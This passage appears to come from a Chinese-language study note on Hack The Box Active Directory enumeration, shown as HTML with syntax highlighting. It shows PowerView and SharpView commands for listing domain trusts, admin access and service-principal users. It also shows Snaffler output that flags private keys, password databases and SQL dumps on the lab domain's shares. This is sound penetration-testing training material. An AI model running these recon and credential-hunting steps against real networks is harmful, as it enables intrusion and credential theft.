class="hljs-number">09</span> PM<br>WhenChanged     : <span class="hljs-number">2</span>/<span class="hljs-number">27</span>/<span class="hljs-number">2022</span> <span class="hljs-number">12</span>:<span class="hljs-number">02</span>:<span class="hljs-number">39</span> AM<br><br>SourceName      : LOGISTICS.INLANEFREIGHT.LOCAL<br>TargetName      : INLANEFREIGHT.LOCAL<br>TrustType       : WINDOWS_ACTIVE_DIRECTORY<br>TrustAttributes : WITHIN_FOREST<br>TrustDirection  : Bidirectional<br>WhenCreated     : <span class="hljs-number">11</span>/<span class="hljs-number">1</span>/<span class="hljs-number">2021</span> <span class="hljs-number">6</span>:<span class="hljs-number">20</span>:<span class="hljs-number">22</span> PM<br>WhenChanged     : <span class="hljs-number">2</span>/<span class="hljs-number">26</span>/<span class="hljs-number">2022</span> <span class="hljs-number">11</span>:<span class="hljs-number">55</span>:<span class="hljs-number">55</span> PM <br></code></pre></td></tr></table></figure>

<h3 id="本地管理员访问权限测试"><a href="#本地管理员访问权限测试" class="headerlink" title="本地管理员访问权限测试"></a>本地管理员访问权限测试</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">PS</span> C:\htb&gt; <span class="hljs-built_in">Test-AdminAccess</span> <span class="hljs-literal">-ComputerName</span> ACADEMY<span class="hljs-literal">-EA-MS01</span><br><br>ComputerName    IsAdmin<br><span class="hljs-literal">------------</span>    <span class="hljs-literal">-------</span><br>ACADEMY<span class="hljs-literal">-EA-MS01</span>    True <br></code></pre></td></tr></table></figure>

<h3 id="查找已设置-SPN-的用户"><a href="#查找已设置-SPN-的用户" class="headerlink" title="查找已设置 SPN 的用户"></a>查找已设置 SPN 的用户</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">PS</span> C:\htb&gt; <span class="hljs-built_in">Get-DomainUser</span> <span class="hljs-literal">-SPN</span> <span class="hljs-literal">-Properties</span> samaccountname,ServicePrincipalName<br><br>serviceprincipalname                          samaccountname<br><span class="hljs-literal">--------------------</span>                          <span class="hljs-literal">--------------</span><br>adfsconnect/azure01.inlanefreight.local       adfs<br>backupjob/veam001.inlanefreight.local         backupagent<br>d0wngrade/kerberoast.inlanefreight.local      d0wngrade<br>kadmin/changepw                               krbtgt<br>MSSQLSvc/DEV<span class="hljs-literal">-PRE-SQL</span>.inlanefreight.local:<span class="hljs-number">1433</span> sqldev<br>MSSQLSvc/SPSJDB.inlanefreight.local:<span class="hljs-number">1433</span>      sqlprod<br>MSSQLSvc/SQL<span class="hljs-literal">-CL01-01inlanefreight</span>.local:<span class="hljs-number">49351</span> sqlqa<br>sts/inlanefreight.local                       solarwindsmonitor<br>testspn/kerberoast.inlanefreight.local        testspn<br>testspn2/kerberoast.inlanefreight.local       testspn2<br></code></pre></td></tr></table></figure>

<h2 id="9-SharpView"><a href="#9-SharpView" class="headerlink" title="9. SharpView"></a>9. SharpView</h2><h3 id="枚举有关特定用户"><a href="#枚举有关特定用户" class="headerlink" title="枚举有关特定用户"></a>枚举有关特定用户</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">PS</span> C:\htb&gt; .\SharpView.exe <span class="hljs-built_in">Get-DomainUser</span> <span class="hljs-literal">-Identity</span> forend<br><br>[<span class="hljs-built_in">Get-DomainSearcher</span>] search base: LDAP://ACADEMY<span class="hljs-literal">-EA-DC01</span>.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL<br>[<span class="hljs-built_in">Get-DomainUser</span>] <span class="hljs-keyword">filter</span> string: (&amp;(samAccountType=<span class="hljs-number">805306368</span>)(|(samAccountName=forend)))<br>objectsid                      : &#123;S<span class="hljs-literal">-1-5-21-3842939050-3880317879-2865463114-5614</span>&#125;<br>samaccounttype                 : USER_OBJECT<br>objectguid                     : <span class="hljs-number">53264142</span><span class="hljs-literal">-082a-4cb8-8714-8158b4974f3b</span><br>useraccountcontrol             : NORMAL_ACCOUNT<br>accountexpires                 : <span class="hljs-number">12</span>/<span class="hljs-number">31</span>/<span class="hljs-number">1600</span> <span class="hljs-number">4</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span> PM<br>lastlogon                      : <span class="hljs-number">4</span>/<span class="hljs-number">18</span>/<span class="hljs-number">2022</span> <span class="hljs-number">1</span>:<span class="hljs-number">01</span>:<span class="hljs-number">21</span> PM<br>lastlogontimestamp             : <span class="hljs-number">4</span>/<span class="hljs-number">9</span>/<span class="hljs-number">2022</span> <span class="hljs-number">1</span>:<span class="hljs-number">33</span>:<span class="hljs-number">21</span> PM<br>pwdlastset                     : <span class="hljs-number">2</span>/<span class="hljs-number">28</span>/<span class="hljs-number">2022</span> <span class="hljs-number">12</span>:<span class="hljs-number">03</span>:<span class="hljs-number">45</span> PM<br>lastlogoff                     : <span class="hljs-number">12</span>/<span class="hljs-number">31</span>/<span class="hljs-number">1600</span> <span class="hljs-number">4</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span> PM<br>badPasswordTime                : <span class="hljs-number">4</span>/<span class="hljs-number">5</span>/<span class="hljs-number">2022</span> <span class="hljs-number">7</span>:<span class="hljs-number">09</span>:<span class="hljs-number">07</span> AM<br>name                           : forend<br>distinguishedname              : CN=forend,OU=IT Admins,OU=IT,OU=HQ<span class="hljs-literal">-NYC</span>,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL<br>whencreated                    : <span class="hljs-number">2</span>/<span class="hljs-number">28</span>/<span class="hljs-number">2022</span> <span class="hljs-number">8</span>:<span class="hljs-number">03</span>:<span class="hljs-number">45</span> PM<br>whenchanged                    : <span class="hljs-number">4</span>/<span class="hljs-number">9</span>/<span class="hljs-number">2022</span> <span class="hljs-number">8</span>:<span class="hljs-number">33</span>:<span class="hljs-number">21</span> PM<br>samaccountname                 : forend<br>memberof                       : &#123;CN=VPN Users,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL, CN=Shared Calendar Read,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL, CN=Printer Access,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL, CN=File Share <span class="hljs-built_in">H</span> Drive,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL, CN=File Share G Drive,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL&#125;<br>cn                             : &#123;forend&#125;<br>objectclass                    : &#123;top, person, organizationalPerson, user&#125;<br>badpwdcount                    : <span class="hljs-number">0</span><br>countrycode                    : <span class="hljs-number">0</span><br>usnchanged                     : <span class="hljs-number">3259288</span><br>logoncount                     : <span class="hljs-number">26618</span><br>primarygroupid                 : <span class="hljs-number">513</span><br>objectcategory                 : CN=Person,CN=Schema,CN=Configuration,DC=INLANEFREIGHT,DC=LOCAL<br>dscorepropagationdata          : &#123;<span class="hljs-number">3</span>/<span class="hljs-number">24</span>/<span class="hljs-number">2022</span> <span class="hljs-number">3</span>:<span class="hljs-number">58</span>:<span class="hljs-number">07</span> PM, <span class="hljs-number">3</span>/<span class="hljs-number">24</span>/<span class="hljs-number">2022</span> <span class="hljs-number">3</span>:<span class="hljs-number">57</span>:<span class="hljs-number">44</span> PM, <span class="hljs-number">3</span>/<span class="hljs-number">24</span>/<span class="hljs-number">2022</span> <span class="hljs-number">3</span>:<span class="hljs-number">52</span>:<span class="hljs-number">58</span> PM, <span class="hljs-number">3</span>/<span class="hljs-number">24</span>/<span class="hljs-number">2022</span> <span class="hljs-number">3</span>:<span class="hljs-number">49</span>:<span class="hljs-number">31</span> PM, <span class="hljs-number">7</span>/<span class="hljs-number">14</span>/<span class="hljs-number">1601</span> <span class="hljs-number">10</span>:<span class="hljs-number">36</span>:<span class="hljs-number">49</span> PM&#125;<br>usncreated                     : <span class="hljs-number">3054181</span><br>instancetype                   : <span class="hljs-number">4</span><br>codepage                       : <span class="hljs-number">0</span><br></code></pre></td></tr></table></figure>

<h2 id="10-Snaffler"><a href="#10-Snaffler" class="headerlink" title="10. Snaffler"></a>10. Snaffler</h2><h3 id="Snaffler-执行"><a href="#Snaffler-执行" class="headerlink" title="Snaffler 执行"></a>Snaffler 执行</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">Snaffler.exe -s -d inlanefreight.local -o snaffler.log -v data<br></code></pre></td></tr></table></figure>

<h3 id="Snaffler-实战"><a href="#Snaffler-实战" class="headerlink" title="Snaffler 实战"></a>Snaffler 实战</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">PS</span> C:\htb&gt; .\Snaffler.exe  <span class="hljs-literal">-d</span> INLANEFREIGHT.LOCAL <span class="hljs-literal">-s</span> <span class="hljs-literal">-v</span> <span class="hljs-keyword">data</span><br><br> .::::::.:::.    :::.  :::.    .-:::::<span class="hljs-string">&#x27;.-:::::&#x27;</span>:::    .,:::::: :::::::..<br>;;;`    ``;;;;,  `;;;  ;;`;;   ;;;<span class="hljs-string">&#x27;&#x27;</span><span class="hljs-string">&#x27;&#x27;</span> ;;;<span class="hljs-string">&#x27;&#x27;</span><span class="hljs-string">&#x27;&#x27;</span> ;;;    ;;;;<span class="hljs-string">&#x27;&#x27;</span><span class="hljs-string">&#x27;&#x27;</span> ;;;;``;;;;<br><span class="hljs-string">&#x27;[==/[[[[, [[[[[. &#x27;</span>[[ ,[[ <span class="hljs-string">&#x27;[[, [[[,,== [[[,,== [[[     [[cccc   [[[,/[[[&#x27;</span><br>  <span class="hljs-string">&#x27;&#x27;</span><span class="hljs-string">&#x27;    $ $$$ &#x27;</span><span class="hljs-type">Y</span><span class="hljs-variable">$c</span><span class="hljs-variable">$</span><span class="hljs-variable">$c</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$cc</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$c</span>`$<span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-string">&#x27;`` `$$$&#x27;</span>`` <span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-string">&#x27;     $$&quot;&quot;   $$$$$$c</span><br><span class="hljs-string"> 88b    dP 888    Y88 888   888,888     888   o88oo,.__888oo,__ 888b &#x27;</span><span class="hljs-number">88</span><span class="hljs-type">bo</span>,<br>  <span class="hljs-string">&#x27;YMmMY&#x27;</span>  <span class="hljs-type">MMM</span>     <span class="hljs-type">YM</span> <span class="hljs-type">YMM</span>   <span class="hljs-string">&#x27;&#x27;</span>` <span class="hljs-string">&#x27;MM,    &#x27;</span><span class="hljs-type">MM</span>,  <span class="hljs-string">&#x27;&#x27;</span><span class="hljs-string">&#x27;&#x27;</span><span class="hljs-type">YUMMM</span><span class="hljs-string">&#x27;&#x27;</span><span class="hljs-string">&#x27;&#x27;</span><span class="hljs-type">YUMMMMMMM</span>   <span class="hljs-string">&#x27;W&#x27;</span><br>                         <span class="hljs-type">by</span> <span class="hljs-type">l0ss</span> <span class="hljs-type">and</span> <span class="hljs-type">Sh3r4</span> - <span class="hljs-type">github.com</span>/<span class="hljs-type">SnaffCon</span>/<span class="hljs-type">Snaffler</span><br><br><span class="hljs-number">2022</span>-<span class="hljs-number">03</span>-<span class="hljs-number">31</span> <span class="hljs-number">12</span>:<span class="hljs-number">16</span>:<span class="hljs-number">54</span> -<span class="hljs-number">07</span>:<span class="hljs-number">00</span> [<span class="hljs-type">Share</span>] &#123;<span class="hljs-type">Black</span>&#125;(\\<span class="hljs-type">ACADEMY</span>-<span class="hljs-type">EA</span>-<span class="hljs-type">MS01.INLANEFREIGHT.LOCAL</span>\<span class="hljs-type">ADMIN</span><span class="hljs-variable">$</span>)<br><span class="hljs-number">2022</span>-<span class="hljs-number">03</span>-<span class="hljs-number">31</span> <span class="hljs-number">12</span>:<span class="hljs-number">16</span>:<span class="hljs-number">54</span> -<span class="hljs-number">07</span>:<span class="hljs-number">00</span> [<span class="hljs-type">Share</span>] &#123;<span class="hljs-type">Black</span>&#125;(\\<span class="hljs-type">ACADEMY</span>-<span class="hljs-type">EA</span>-<span class="hljs-type">MS01.INLANEFREIGHT.LOCAL</span>\<span class="hljs-type">C</span><span class="hljs-variable">$</span>)<br><span class="hljs-number">2022</span>-<span class="hljs-number">03</span>-<span class="hljs-number">31</span> <span class="hljs-number">12</span>:<span class="hljs-number">16</span>:<span class="hljs-number">54</span> -<span class="hljs-number">07</span>:<span class="hljs-number">00</span> [<span class="hljs-type">Share</span>] &#123;<span class="hljs-type">Green</span>&#125;(\\<span class="hljs-type">ACADEMY</span>-<span class="hljs-type">EA</span>-<span class="hljs-type">MX01.INLANEFREIGHT.LOCAL</span>\<span class="hljs-type">address</span>)<br><span class="hljs-number">2022</span>-<span class="hljs-number">03</span>-<span class="hljs-number">31</span> <span class="hljs-number">12</span>:<span class="hljs-number">16</span>:<span class="hljs-number">54</span> -<span class="hljs-number">07</span>:<span class="hljs-number">00</span> [<span class="hljs-type">Share</span>] &#123;<span class="hljs-type">Green</span>&#125;(\\<span class="hljs-type">ACADEMY</span>-<span class="hljs-type">EA</span>-<span class="hljs-type">DC01.INLANEFREIGHT.LOCAL</span>\<span class="hljs-type">Department</span> <span class="hljs-type">Shares</span>)<br><span class="hljs-number">2022</span>-<span class="hljs-number">03</span>-<span class="hljs-number">31</span> <span class="hljs-number">12</span>:<span class="hljs-number">16</span>:<span class="hljs-number">54</span> -<span class="hljs-number">07</span>:<span class="hljs-number">00</span> [<span class="hljs-type">Share</span>] &#123;<span class="hljs-type">Green</span>&#125;(\\<span class="hljs-type">ACADEMY</span>-<span class="hljs-type">EA</span>-<span class="hljs-type">DC01.INLANEFREIGHT.LOCAL</span>\<span class="hljs-type">User</span> <span class="hljs-type">Shares</span>)<br><span class="hljs-number">2022</span>-<span class="hljs-number">03</span>-<span class="hljs-number">31</span> <span class="hljs-number">12</span>:<span class="hljs-number">16</span>:<span class="hljs-number">54</span> -<span class="hljs-number">07</span>:<span class="hljs-number">00</span> [<span class="hljs-type">Share</span>] &#123;<span class="hljs-type">Green</span>&#125;(\\<span class="hljs-type">ACADEMY</span>-<span class="hljs-type">EA</span>-<span class="hljs-type">DC01.INLANEFREIGHT.LOCAL</span>\<span class="hljs-type">ZZZ_archive</span>)<br><span class="hljs-number">2022</span>-<span class="hljs-number">03</span>-<span class="hljs-number">31</span> <span class="hljs-number">12</span>:<span class="hljs-number">17</span>:<span class="hljs-number">18</span> -<span class="hljs-number">07</span>:<span class="hljs-number">00</span> [<span class="hljs-type">Share</span>] &#123;<span class="hljs-type">Green</span>&#125;(\\<span class="hljs-type">ACADEMY</span>-<span class="hljs-type">EA</span>-<span class="hljs-type">CA01.INLANEFREIGHT.LOCAL</span>\<span class="hljs-type">CertEnroll</span>)<br><span class="hljs-number">2022</span>-<span class="hljs-number">03</span>-<span class="hljs-number">31</span> <span class="hljs-number">12</span>:<span class="hljs-number">17</span>:<span class="hljs-number">19</span> -<span class="hljs-number">07</span>:<span class="hljs-number">00</span> [<span class="hljs-type">File</span>] &#123;<span class="hljs-type">Black</span>&#125;&lt;<span class="hljs-type">KeepExtExactBlack</span>|<span class="hljs-type">R</span>|^\<span class="hljs-type">.kdb</span><span class="hljs-variable">$</span>|<span class="hljs-number">289</span><span class="hljs-type">B</span>|<span class="hljs-number">3</span>/<span class="hljs-number">31</span>/<span class="hljs-number">2022</span> <span class="hljs-number">12</span>:<span class="hljs-number">09</span>:<span class="hljs-number">22</span> <span class="hljs-type">PM</span>&gt;(\\<span class="hljs-type">ACADEMY</span>-<span class="hljs-type">EA</span>-<span class="hljs-type">DC01.INLANEFREIGHT.LOCAL</span>\<span class="hljs-type">Department</span> <span class="hljs-type">Shares</span>\<span class="hljs-type">IT</span>\<span class="hljs-type">Infosec</span>\<span class="hljs-type">GroupBackup.kdb</span>) <span class="hljs-type">.kdb</span><br><span class="hljs-number">2022</span>-<span class="hljs-number">03</span>-<span class="hljs-number">31</span> <span class="hljs-number">12</span>:<span class="hljs-number">17</span>:<span class="hljs-number">19</span> -<span class="hljs-number">07</span>:<span class="hljs-number">00</span> [<span class="hljs-type">File</span>] &#123;<span class="hljs-type">Red</span>&#125;&lt;<span class="hljs-type">KeepExtExactRed</span>|<span class="hljs-type">R</span>|^\<span class="hljs-type">.key</span><span class="hljs-variable">$</span>|<span class="hljs-number">299</span><span class="hljs-type">B</span>|<span class="hljs-number">3</span>/<span class="hljs-number">31</span>/<span class="hljs-number">2022</span> <span class="hljs-number">12</span>:<span class="hljs-number">05</span>:<span class="hljs-number">33</span> <span class="hljs-type">PM</span>&gt;(\\<span class="hljs-type">ACADEMY</span>-<span class="hljs-type">EA</span>-<span class="hljs-type">DC01.INLANEFREIGHT.LOCAL</span>\<span class="hljs-type">Department</span> <span class="hljs-type">Shares</span>\<span class="hljs-type">IT</span>\<span class="hljs-type">Infosec</span>\<span class="hljs-type">ShowReset.key</span>) <span class="hljs-type">.key</span><br><span class="hljs-number">2022</span>-<span class="hljs-number">03</span>-<span class="hljs-number">31</span> <span class="hljs-number">12</span>:<span class="hljs-number">17</span>:<span class="hljs-number">19</span> -<span class="hljs-number">07</span>:<span class="hljs-number">00</span> [<span class="hljs-type">Share</span>] &#123;<span class="hljs-type">Green</span>&#125;(\\<span class="hljs-type">ACADEMY</span>-<span class="hljs-type">EA</span>-<span class="hljs-type">FILE.INLANEFREIGHT.LOCAL</span>\<span class="hljs-type">UpdateServicesPackages</span>)<br><span class="hljs-number">2022</span>-<span class="hljs-number">03</span>-<span class="hljs-number">31</span> <span class="hljs-number">12</span>:<span class="hljs-number">17</span>:<span class="hljs-number">19</span> -<span class="hljs-number">07</span>:<span class="hljs-number">00</span> [<span class="hljs-type">File</span>] &#123;<span class="hljs-type">Black</span>&#125;&lt;<span class="hljs-type">KeepExtExactBlack</span>|<span class="hljs-type">R</span>|^\<span class="hljs-type">.kwallet</span><span class="hljs-variable">$</span>|<span class="hljs-number">302</span><span class="hljs-type">B</span>|<span class="hljs-number">3</span>/<span class="hljs-number">31</span>/<span class="hljs-number">2022</span> <span class="hljs-number">12</span>:<span class="hljs-number">04</span>:<span class="hljs-number">45</span> <span class="hljs-type">PM</span>&gt;(\\<span class="hljs-type">ACADEMY</span>-<span class="hljs-type">EA</span>-<span class="hljs-type">DC01.INLANEFREIGHT.LOCAL</span>\<span class="hljs-type">Department</span> <span class="hljs-type">Shares</span>\<span class="hljs-type">IT</span>\<span class="hljs-type">Infosec</span>\<span class="hljs-type">WriteUse.kwallet</span>) <span class="hljs-type">.kwallet</span><br><span class="hljs-number">2022</span>-<span class="hljs-number">03</span>-<span class="hljs-number">31</span> <span class="hljs-number">12</span>:<span class="hljs-number">17</span>:<span class="hljs-number">19</span> -<span class="hljs-number">07</span>:<span class="hljs-number">00</span> [<span class="hljs-type">File</span>] &#123;<span class="hljs-type">Red</span>&#125;&lt;<span class="hljs-type">KeepExtExactRed</span>|<span class="hljs-type">R</span>|^\<span class="hljs-type">.key</span><span class="hljs-variable">$</span>|<span class="hljs-number">298</span><span class="hljs-type">B</span>|<span class="hljs-number">3</span>/<span class="hljs-number">31</span>/<span class="hljs-number">2022</span> <span class="hljs-number">12</span>:<span class="hljs-number">05</span>:<span class="hljs-number">10</span> <span class="hljs-type">PM</span>&gt;(\\<span class="hljs-type">ACADEMY</span>-<span class="hljs-type">EA</span>-<span class="hljs-type">DC01.INLANEFREIGHT.LOCAL</span>\<span class="hljs-type">Department</span> <span class="hljs-type">Shares</span>\<span class="hljs-type">IT</span>\<span class="hljs-type">Infosec</span>\<span class="hljs-type">ProtectStep.key</span>) <span class="hljs-type">.key</span><br><span class="hljs-number">2022</span>-<span class="hljs-number">03</span>-<span class="hljs-number">31</span> <span class="hljs-number">12</span>:<span class="hljs-number">17</span>:<span class="hljs-number">19</span> -<span class="hljs-number">07</span>:<span class="hljs-number">00</span> [<span class="hljs-type">File</span>] &#123;<span class="hljs-type">Black</span>&#125;&lt;<span class="hljs-type">KeepExtExactBlack</span>|<span class="hljs-type">R</span>|^\<span class="hljs-type">.ppk</span><span class="hljs-variable">$</span>|<span class="hljs-number">275</span><span class="hljs-type">B</span>|<span class="hljs-number">3</span>/<span class="hljs-number">31</span>/<span class="hljs-number">2022</span> <span class="hljs-number">12</span>:<span class="hljs-number">04</span>:<span class="hljs-number">40</span> <span class="hljs-type">PM</span>&gt;(\\<span class="hljs-type">ACADEMY</span>-<span class="hljs-type">EA</span>-<span class="hljs-type">DC01.INLANEFREIGHT.LOCAL</span>\<span class="hljs-type">Department</span> <span class="hljs-type">Shares</span>\<span class="hljs-type">IT</span>\<span class="hljs-type">Infosec</span>\<span class="hljs-type">StopTrace.ppk</span>) <span class="hljs-type">.ppk</span><br><span class="hljs-number">2022</span>-<span class="hljs-number">03</span>-<span class="hljs-number">31</span> <span class="hljs-number">12</span>:<span class="hljs-number">17</span>:<span class="hljs-number">19</span> -<span class="hljs-number">07</span>:<span class="hljs-number">00</span> [<span class="hljs-type">File</span>] &#123;<span class="hljs-type">Red</span>&#125;&lt;<span class="hljs-type">KeepExtExactRed</span>|<span class="hljs-type">R</span>|^\<span class="hljs-type">.key</span><span class="hljs-variable">$</span>|<span class="hljs-number">301</span><span class="hljs-type">B</span>|<span class="hljs-number">3</span>/<span class="hljs-number">31</span>/<span class="hljs-number">2022</span> <span class="hljs-number">12</span>:<span class="hljs-number">09</span>:<span class="hljs-number">17</span> <span class="hljs-type">PM</span>&gt;(\\<span class="hljs-type">ACADEMY</span>-<span class="hljs-type">EA</span>-<span class="hljs-type">DC01.INLANEFREIGHT.LOCAL</span>\<span class="hljs-type">Department</span> <span class="hljs-type">Shares</span>\<span class="hljs-type">IT</span>\<span class="hljs-type">Infosec</span>\<span class="hljs-type">WaitClear.key</span>) <span class="hljs-type">.key</span><br><span class="hljs-number">2022</span>-<span class="hljs-number">03</span>-<span class="hljs-number">31</span> <span class="hljs-number">12</span>:<span class="hljs-number">17</span>:<span class="hljs-number">19</span> -<span class="hljs-number">07</span>:<span class="hljs-number">00</span> [<span class="hljs-type">File</span>] &#123;<span class="hljs-type">Red</span>&#125;&lt;<span class="hljs-type">KeepExtExactRed</span>|<span class="hljs-type">R</span>|^\<span class="hljs-type">.sqldump</span><span class="hljs-variable">$</span>|<span class="hljs-number">312</span><span class="hljs-type">B</span>|<span class="hljs-number">3</span>/<span class="hljs-number">31</span>/<span class="hljs-number">2022</span> <span class="hljs-number">12</span>:<span class="hljs-number">05</span>:<span class="hljs-number">30</span> <span class="hljs-type">PM</span>&gt;(\\<span class="hljs-type">ACADEMY</span>-<span class="hljs-type">EA</span>-<span class="hljs-type">DC01.INLANEFREIGHT.LOCAL</span>\<span class="hljs-type">Department</span> <span class="hljs-type">Shares</span>\<span class="hljs-type">IT</span>\<span class="hljs-type">Development</span>\<span class="hljs-type">DenyRedo.sqldump</span>) <span class="hljs-type">.sqldump</span><br><span class="hljs-number">2022</span>-<span class="hljs-number">03</span>-<span class="hljs-number">31</span> <span class="hljs-number">12</span>:<span class="hljs-number">17</span>:<span class="hljs-number">19</span> -<span class="hljs-number">07</span>:<span class="hljs-number">00</span> [<span class="hljs-type">File</span>] &#123;<span class="hljs-type">Red</span>&#125;&lt;<span class="hljs-type">KeepExtExactRed</span>|<span class="hljs-type">R</span>|^\<span class="hljs-type">.sqldump</span><span class="hljs-variable">$</span>|<span class="hljs-number">310</span><span class="hljs-type">B</span>|<span class="hljs-number">3</span>/<span class="hljs-number">31</span>/<span class="hljs-number">2022</span> <span class="hljs-number">12</span>:<span class="hljs-number">05</span>:<span class="hljs-number">02</span> <span class="hljs-type">PM</span>&gt;(\\<span class="hljs-type">ACADEMY</span>-<span class="hljs-type">EA</span>-<span class="hljs-type">DC01.INLANEFREIGHT.LOCAL</span>\<span class="hljs-type">Department</span> <span class="hljs-type">Shares</span>\<span class="hljs-type">IT</span>\<span class="hljs-type">Development</span>\<span class="hljs-type">AddPublish.sqldump</span>) <span class="hljs-type">.sqldump</span><br><span class="hljs-number">2022</span>-<span class="hljs-number">03</span>-<span class="hljs-number">31</span> <span class="hljs-number">12</span>:<span class="hljs-number">17</span>:<span class="hljs-number">19</span> -<span class="hljs-number">07</span>:<span class="hljs-number">00</span> [<span class="hljs-type">Share</span>] &#123;<span class="hljs-type">Green</span>&#125;(\\<span class="hljs-type">ACADEMY</span>-<span class="hljs-type">EA</span>-<span class="hljs-type">FILE.INLANEFREIGHT.LOCAL</span>\<span class="hljs-type">WsusContent</span>)<br><span class="hljs-number">2022</span>-<span class="hljs-number">03</span>-<span class="hljs-number">31</span> <span class="hljs-number">12</span>:<span class="hljs-number">17</span>:<span class="hljs-number">19</span> -<span class="hljs-number">07</span>:<span class="hljs-number">00</span> [<span class="hljs-type">File</span>] &#123;<span class="hljs-type">Red</span>&#125;&lt;<span class="hljs-type">KeepExtExactRed</span>|<span class="hljs-type">R</span>|^\<span class="hljs-type">.keychain</span><span class="hljs-variable">$</span>|<span class="hljs-number">295</span><span class="hljs-type">B</span>|<span class="hljs-number">3</span>/<span class="hljs-number">31</span>/<span class="hljs-number">2022</span> <span class="hljs-number">12</span>:<span class="hljs-number">08</span>:<span class="hljs-number">42</span> <span class="hljs-type">PM</span>&gt;(\\<span class="hljs-type">ACADEMY</span>-<span class="hljs-type">EA</span>-<span class="hljs-type">DC01.INLANEFREIGHT.LOCAL</span>\<span class="hljs-type">Department</span> <span class="hljs-type">Shares</span>\<span class="hljs-type">IT</span>\<span class="hljs-type">Infosec</span>\<span class="hljs-type">SetStep.keychain</span>) <span class="hljs-type">.keychain</span><br><span class="hljs-number">2022</span>-<span class="hljs-number">03</span>-<span class="hljs-number">31</span> <span class="hljs-number">12</span>:<span class="hljs-number">17</span>:<span class="hljs-number">19</span> -<span class="hljs-number">07</span>:<span class="hljs-number">00</span> [<span class="hljs-type">File</span>] &#123;<span class="hljs-type">Black</span>&#125;&lt;<span class="hljs-type">KeepExtExactBlack</span>|<span class="hljs-type">R</span>|^\<span class="hljs-type">.tblk</span><span class="hljs-variable">$</span>|<span class="hljs-number">279</span><span class="hljs-type">B</span>|<span class="hljs-number">3</span>/<span class="hljs-number">31</span>/<span class="hljs-number">2022</span> <span class="hljs-number">12</span>:<span class="hljs-number">05</span>:<span class="hljs-number">25</span> <span class="hljs-type">PM</span>&gt;(\\<span class="hljs-type">ACADEMY</span>-<span class="hljs-type">EA</span>-<span class="hljs-type">DC01.INLANEFREIGHT.LOCAL</span>\<span class="hljs-type">Department</span> <span class="hljs-type">Shares</span>\<span class="hljs-type">IT</span>\<span class="hljs-type">Development</span>\<span class="hljs-type">FindConnect.tblk</span>) <span class="hljs-type">.tblk</span><br><span class="hljs-number">2022</span>-<span class="hljs-number">03</span>-<span class="hljs-number">31</span> <span class="hljs-number">12</span>:<span class="hljs-number">17</span>:<span class="hljs-number">19</span> -<span class="hljs-number">07</span>:<span class="hljs-number">00</span> [<span class="hljs-type">File</span>] &#123;<span class="hljs-type">Black</span>&#125;&lt;<span class="hljs-type">KeepExtExactBlack</span>|<span class="hljs-type">R</span>|^\<span class="hljs-type">.psafe3</span><span class="hljs-variable">$</span>|<span class="hljs-number">301</span><span class="hljs-type">B</span>|<span class="hljs-number">3</span>/<span class="hljs-number">31</span>/<span class="hljs-number">2022</span> <span class="hljs-number">12</span>:<span class="hljs-number">09</span>:<span class="hljs-number">33</span> <span class="hljs-type">PM</span>&gt;(\\<span class="hljs-type">ACADEMY</span>-<span class="hljs-type">EA</span>-<span class="hljs-type">DC01.INLANEFREIGHT.LOCAL</span>\<span class="hljs-type">Department</span> <span class="hljs-type">Shares</span>\<span 